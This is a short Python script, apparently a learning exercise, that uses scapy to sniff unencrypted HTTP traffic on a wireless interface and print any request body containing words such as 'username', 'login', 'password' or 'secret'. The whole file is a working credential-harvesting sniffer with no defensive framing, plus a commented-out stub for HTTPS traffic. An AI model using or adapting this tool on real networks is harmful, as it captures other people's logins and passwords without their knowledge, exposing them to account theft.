import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=handle_packets)


def handle_packets(packet):
    if http.HTTPRequest in packet:
        # http packet.
        if scapy.Raw in packet:
            load = str(packet[scapy.Raw].load)
            keywords = ['username', 'user', 'login', 'register', 'sign-up', 'signUp', 'password', 'pass', 'secret']

            for keyword in keywords:
                if keyword in load:
                    print(load)
                    break
    # elif scapy.TCP in packet:
    #     if packet[scapy.TCP].dport == 443:
    #         # ssl packet.
    #         print('')


def geturl(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


sniff('wlp2s0')
